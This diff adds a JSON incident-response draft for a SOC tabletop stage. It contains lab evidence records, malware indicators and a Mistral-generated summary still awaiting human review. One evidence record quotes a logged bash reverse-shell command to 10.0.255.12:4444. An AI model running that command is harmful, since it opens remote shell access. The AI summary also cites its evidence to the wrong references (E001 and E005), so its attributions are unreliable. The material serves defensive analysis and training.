@@ -1,0 +1,199 @@
+{
+  "draft_id": "stage_S4",
+  "created_utc": "2026-11-24T13:59:25+00:00",
+  "generator": "Week-4/IR/ai_report_drafter.py",
+  "prompt_file": "Week-4/Prompts/stage_summary.txt",
+  "prompt_sha256": "8db9d6862a1cab9f8d0a61a6dce175ee73522cc8001a295cc0fbcb017b61c619",
+  "facts": [
+    {
+      "ref": "E001",
+      "raw": "[E001] Stage S4 \"Execution\" (Execution, domain endpoint) of tabletop scenario W4-TT-01. This stage is represented by historical lab evidence; the link to other stages is a scenario construct.",
+      "text": "Stage S4 \"Execution\" (Execution, domain endpoint) of tabletop scenario W4-TT-01. This stage is represented by historical lab evidence; the link to other stages is a scenario construct.",
+      "source": "Week-4/Config/scenario.json"
+    },
+    {
+      "ref": "E002",
+      "raw": "[E002] SIEM-MAL-003 \"Suspicious executable with DNS + outbound connection\" (endpoint). key facts: process_image=C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe; parent_process=C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe; sha256=A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1; imphash=2EABE9054CAD5152567F0699947A2C5B; destination_ip=104.80.2.104; destination_port=443; dns_query_count=10; domains=plodnittpw.lat, bloodyswif.lat, washyceehsu.lat, leggelatez.lat, miniatureyu.lat, kickykiduz.lat; dataset=9c9aa5_campaign.evtx. events: 2025-06-13T00:35:40.5074673+03:00 Sysmon 1 process create C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe (parent C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe); 2025-06-13T00:35:43.1123186+03:00 Sysmon 22 DNS query plodnittpw.lat; 2025-06-13T00:35:44.1279185+03:00 Sysmon 22 DNS query finickypwk.lat; 2025-06-13T00:35:44.1279330+03:00 Sysmon 22 DNS query steamcommunity.com. 12 source records in total. AI severity High, confidence Medium, QA SCHEMA_PASS_HUMAN_REVIEW_REQUIRED. human review: PENDING (Week-2 REVIEW_REQUIRED; Week-3 tickets Pending Review)",
+      "text": "SIEM-MAL-003 \"Suspicious executable with DNS + outbound connection\" (endpoint). key facts: process_image=C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe; parent_process=C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe; sha256=A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1; imphash=2EABE9054CAD5152567F0699947A2C5B; destination_ip=104.80.2.104; destination_port=443; dns_query_count=10; domains=plodnittpw.lat, bloodyswif.lat, washyceehsu.lat, leggelatez.lat, miniatureyu.lat, kickykiduz.lat; dataset=9c9aa5_campaign.evtx. events: 2025-06-13T00:35:40.5074673+03:00 Sysmon 1 process create C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe (parent C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe); 2025-06-13T00:35:43.1123186+03:00 Sysmon 22 DNS query plodnittpw.lat; 2025-06-13T00:35:44.1279185+03:00 Sysmon 22 DNS query finickypwk.lat; 2025-06-13T00:35:44.1279330+03:00 Sysmon 22 DNS query steamcommunity.com. 12 source records in total. AI severity High, confidence Medium, QA SCHEMA_PASS_HUMAN_REVIEW_REQUIRED. human review: PENDING (Week-2 REVIEW_REQUIRED; Week-3 tickets Pending Review)",
+      "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+    },
+    {
+      "ref": "E003",
+      "raw": "[E003] SIEM-MAL-003 ATT&CK T1204.002 User Execution: Malicious File (Execution), confidence label: candidate. Basis: Executable launched from IXP000.TMP/IXP001.TMP temp extraction paths (Sysmon ID 1); maliciousness not verified by hash reputation",
+      "text": "SIEM-MAL-003 ATT&CK T1204.002 User Execution: Malicious File (Execution), confidence label: candidate. Basis: Executable launched from IXP000.TMP/IXP001.TMP temp extraction paths (Sysmon ID 1); maliciousness not verified by hash reputation",
+      "source": "Week-4/Config/attack_mapping.json"
+    },
+    {
+      "ref": "E004",
+      "raw": "[E004] SIEM-MAL-003 ATT&CK T1071.001 Application Layer Protocol: Web Protocols (Command and Control), confidence label: candidate. Basis: 10 DNS queries and one outbound connection to 104.80.2.104:443 from the same process; Week-2 states this alone does not establish C2",
+      "text": "SIEM-MAL-003 ATT&CK T1071.001 Application Layer Protocol: Web Protocols (Command and Control), confidence label: candidate. Basis: 10 DNS queries and one outbound connection to 104.80.2.104:443 from the same process; Week-2 states this alone does not establish C2",
+      "source": "Week-4/Config/attack_mapping.json"
+    },
+    {
+      "ref": "E005",
+      "raw": "[E005] SIEM-MAL-003 not established / limitation: Behavioral correlation indicates suspicious activity; infection is not independently confirmed.",
+      "text": "SIEM-MAL-003 not established / limitation: Behavioral correlation indicates suspicious activity; infection is not independently confirmed.",
+      "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+    },
+    {
+      "ref": "E006",
+      "raw": "[E006] SIEM-MAL-003 not established / limitation: Original Sysmon events are from historical laboratory replay; _timestamp is ingestion time.",
+      "text": "SIEM-MAL-003 not established / limitation: Original Sysmon events are from historical laboratory replay; _timestamp is ingestion time.",
+      "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+    },
+    {
+      "ref": "E007",
+      "raw": "[E007] SIEM-MAL-003 not established / limitation: Trigger key verifies the alert rule, not exact alert-row provenance.",
+      "text": "SIEM-MAL-003 not established / limitation: Trigger key verifies the alert rule, not exact alert-row provenance.",
+      "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+    },
+    {
+      "ref": "E008",
+      "raw": "[E008] SIEM-MAL-003 proposal (containment, not executed, deferred): Propose isolation of host running C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe (NOT executed)",
+      "text": "SIEM-MAL-003 proposal (containment, not executed, deferred): Propose isolation of host running C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe (NOT executed)",
+      "source": "Week-3/SOAR/tickets/e05ccfe875e6a53524e7270675a6720d54c7ae95ab4353e906f32f04c14f14b9.json"
+    },
+    {
+      "ref": "E009",
+      "raw": "[E009] SIEM-MAL-003 proposal (containment, not executed, deferred): Propose blocklisting SHA256 A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1 (NOT executed)",
+      "text": "SIEM-MAL-003 proposal (containment, not executed, deferred): Propose blocklisting SHA256 A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1 (NOT executed)",
+      "source": "Week-3/SOAR/tickets/e05ccfe875e6a53524e7270675a6720d54c7ae95ab4353e906f32f04c14f14b9.json"
+    },
+    {
+      "ref": "E010",
+      "raw": "[E010] SIEM-MAL-003 proposal (eradication, not executed, deferred): Remove C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe and its parent C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe from the affected host after evidence preservation.",
+      "text": "SIEM-MAL-003 proposal (eradication, not executed, deferred): Remove C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe and its parent C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe from the affected host after evidence preservation.",
+      "source": "Week-4/Config/response_catalog.json"
+    },
+    {
+      "ref": "E011",
+      "raw": "[E011] LT-03 \"Bash reverse-shell command pattern\" (endpoint). key facts: host=ip-10-0-255-92; user=root; target_ip=10.0.255.12; target_port=4444; command_line=bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53; process_guid={ec227f46-1086-665a-0dcf-bdc908560000}. events: 2024-05-31T18:01:42.639983000Z /usr/bin/bash (parent /usr/bin/dash) user=root: bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53. human review: Corrected",
+      "text": "LT-03 \"Bash reverse-shell command pattern\" (endpoint). key facts: host=ip-10-0-255-92; user=root; target_ip=10.0.255.12; target_port=4444; command_line=bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53; process_guid={ec227f46-1086-665a-0dcf-bdc908560000}. events: 2024-05-31T18:01:42.639983000Z /usr/bin/bash (parent /usr/bin/dash) user=root: bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53. human review: Corrected",
+      "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Verified-Timeline.csv"
+    },
+    {
+      "ref": "E012",
+      "raw": "[E012] LT-03 ATT&CK T1059.004 Command and Scripting Interpreter: Unix Shell (Execution), confidence label: observed_pattern. Basis: bash -c with /dev/tcp/10.0.255.12/4444 redirection (LT-03 verified timeline); network success unconfirmed",
+      "text": "LT-03 ATT&CK T1059.004 Command and Scripting Interpreter: Unix Shell (Execution), confidence label: observed_pattern. Basis: bash -c with /dev/tcp/10.0.255.12/4444 redirection (LT-03 verified timeline); network success unconfirmed",
+      "source": "Week-4/Config/attack_mapping.json"
+    },
+    {
+      "ref": "E013",
+      "raw": "[E013] LT-03 not established / limitation: Network success, interactive access and intent are unconfirmed (network_outcome=unknown).",
+      "text": "LT-03 not established / limitation: Network success, interactive access and intent are unconfirmed (network_outcome=unknown).",
+      "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Verified-Timeline.csv"
+    },
+    {
+      "ref": "E014",
+      "raw": "[E014] LT-03 read-only check result: Original Sysmon-for-Linux file has 2 event(s), Event IDs ['1']; no Event ID 3 (network connection) record exists, so connection success cannot be established from this dataset.",
+      "text": "LT-03 read-only check result: Original Sysmon-for-Linux file has 2 event(s), Event IDs ['1']; no Event ID 3 (network connection) record exists, so connection success cannot be established from this dataset.",
+      "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Sysmon-original.log"
+    },
+    {
+      "ref": "E015",
+      "raw": "[E015] LT-03 proposal (containment, not executed, approved): Isolate ip-10-0-255-92 from the network and block egress to 10.0.255.12:4444.",
+      "text": "LT-03 proposal (containment, not executed, approved): Isolate ip-10-0-255-92 from the network and block egress to 10.0.255.12:4444.",
+      "source": "Week-4/Config/response_catalog.json"
+    },
+    {
+      "ref": "E016",
+      "raw": "[E016] LT-03 proposal (eradication, not executed, approved): Terminate the bash process tree (ProcessGuid {ec227f46-1086-665a-0dcf-bdc908560000}) and check root persistence (cron, shell rc files, authorized_keys).",
+      "text": "LT-03 proposal (eradication, not executed, approved): Terminate the bash process tree (ProcessGuid {ec227f46-1086-665a-0dcf-bdc908560000}) and check root persistence (cron, shell rc files, authorized_keys).",
+      "source": "Week-4/Config/response_catalog.json"
+    },
+    {
+      "ref": "E017",
+      "raw": "[E017] Analyst question for this stage: Is the dropped executable malicious (hash verdict), and did the reverse-shell connection succeed?",
+      "text": "Analyst question for this stage: Is the dropped executable malicious (hash verdict), and did the reverse-shell connection succeed?",
+      "source": "Week-4/Config/scenario.json"
+    }
+  ],
+  "status": "generated",
+  "model": "Mistral:7b-instruct-v0.3-q4_K_S",
+  "options": {
+    "temperature": 0.2,
+    "repeat_penalty": 1.15,
+    "num_ctx": 6144,
+    "num_predict": 1500,
+    "seed": 42
+  },
+  "attempts": [
+    {
+      "attempt": 1,
+      "model": "Mistral:7b-instruct-v0.3-q4_K_S",
+      "options": {
+        "temperature": 0.2,
+        "repeat_penalty": 1.15,
+        "num_ctx": 6144,
+        "num_predict": 1500,
+        "seed": 42
+      },
+      "outcome": "success",
+      "seconds": 359.34
+    }
+  ],
+  "done_reason": "stop",
+  "truncated": false,
+  "tokens_per_second": 2.0,
+  "wall_seconds": 359.34,
+  "eval_count": 643,
+  "text": "1. STAGE SUMMARY: During Stage S4 of scenario W4-TT-01, a suspicious executable was detected on a domain endpoint with DNS queries and outbound connections to multiple domains and an IP address. The stage is represented by historical lab evidence, but the behavioral correlation indicates suspicious activity without independently confirming infection or network success.\n\n2. EVIDENCE OBSERVED:\n   - Process image: C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe [E001]\n   - Parent process: C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe [E001]\n   - SHA-256 hash: A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1 [E001]\n   - IMP hash: 2EABE9054CAD5152567F0699947A2C5B [E001]\n   - Destination IP: 104.80.2.104 [E001]\n   - Destination port: 443 [E001]\n   - DNS queries count: 10 [E001]\n   - Domains: plodnittpw.lat, bloodyswif.lat, washyceehsu.lat, leggelatez.lat, miniatureyu.lat, kickykiduz.lat [E001]\n\n3. ATTACK TECHNIQUES:\n   - T1204.002 User Execution: Malicious File (Execution), confidence label: candidate [E003]\n   - T1071.001 Application Layer Protocol: Web Protocols (Command and Control), confidence label: candidate [E004]\n\n4. WHAT IS NOT ESTABLISHED:\n   - Whether the dropped executable is malicious (hash verdict) [E005]\n   - If the reverse-shell connection succeeded [E005]\n   - The exact alert-row provenance of the trigger key [E007]\n   - Network success in LT-03 incident [E013]\n\n5. ANALYST QUESTION: Is the dropped executable malicious (hash verdict), and did the reverse-shell connection succeed? [E017]\n\n6. REVIEW STATUS: DRAFT - AI-generated, requires human analyst validation before use.",
+  "sections": {
+    "STAGE SUMMARY": "During Stage S4 of scenario W4-TT-01, a suspicious executable was detected on a domain endpoint with DNS queries and outbound connections to multiple domains and an IP address. The stage is represented by historical lab evidence, but the behavioral correlation indicates suspicious activity without independently confirming infection or network success.",
+    "EVIDENCE OBSERVED": "- Process image: C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe [E001]\n   - Parent process: C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe [E001]\n   - SHA-256 hash: A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1 [E001]\n   - IMP hash: 2EABE9054CAD5152567F0699947A2C5B [E001]\n   - Destination IP: 104.80.2.104 [E001]\n   - Destination port: 443 [E001]\n   - DNS queries count: 10 [E001]\n   - Domains: plodnittpw.lat, bloodyswif.lat, washyceehsu.lat, leggelatez.lat, miniatureyu.lat, kickykiduz.lat [E001]",
+    "ATTACK TECHNIQUES": "- T1204.002 User Execution: Malicious File (Execution), confidence label: candidate [E003]\n   - T1071.001 Application Layer Protocol: Web Protocols (Command and Control), confidence label: candidate [E004]",
+    "WHAT IS NOT ESTABLISHED": "- Whether the dropped executable is malicious (hash verdict) [E005]\n   - If the reverse-shell connection succeeded [E005]\n   - The exact alert-row provenance of the trigger key [E007]\n   - Network success in LT-03 incident [E013]",
+    "ANALYST QUESTION": "Is the dropped executable malicious (hash verdict), and did the reverse-shell connection succeed? [E017]",
+    "REVIEW STATUS": "DRAFT - AI-generated, requires human analyst validation before use."
+  },
+  "validation": {
+    "flags": [],
+    "severity_counts": {
+      "high": 0,
+      "medium": 0,
+      "low": 0
+    },
+    "heading_normalization": "inline 'N. HEADING: text' split before parsing (Week-4)",
+    "disclaimer": "Flags request human review; they are not proof of hallucination. Passing all checks does not prove correctness."
+  },
+  "review": {
+    "status": "Pending Review"
+  },
+  "validation_original": {
+    "flags": [
+      {
+        "check": "missing_section",
+        "severity": "medium",
+        "section": "(whole output)",
+        "value": "STAGE SUMMARY",
+        "message": "Expected section 'STAGE SUMMARY' not found in the model output.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F001"
+      },
+      {
+        "check": "missing_section",
+        "severity": "medium",
+        "section": "WHAT IS NOT ESTABLISHED",
+        "value": "ANALYST QUESTION",
+        "message": "Expected section 'ANALYST QUESTION' not found in the model output.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F002"
+      },
+      {
+        "check": "missing_section",
+        "severity": "medium",
+        "section": "WHAT IS NOT ESTABLISHED",
+        "value": "REVIEW STATUS",
+        "message": "Expected section 'REVIEW STATUS' not found in the model output.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F003"
+      }
+    ],
+    "severity_counts": {
+      "high": 0,
+      "medium": 3,
+      "low": 0
+    },
+    "disclaimer": "Flags request human review; they are not proof of hallucination. Passing all checks does not prove correctness."
+  }
+}
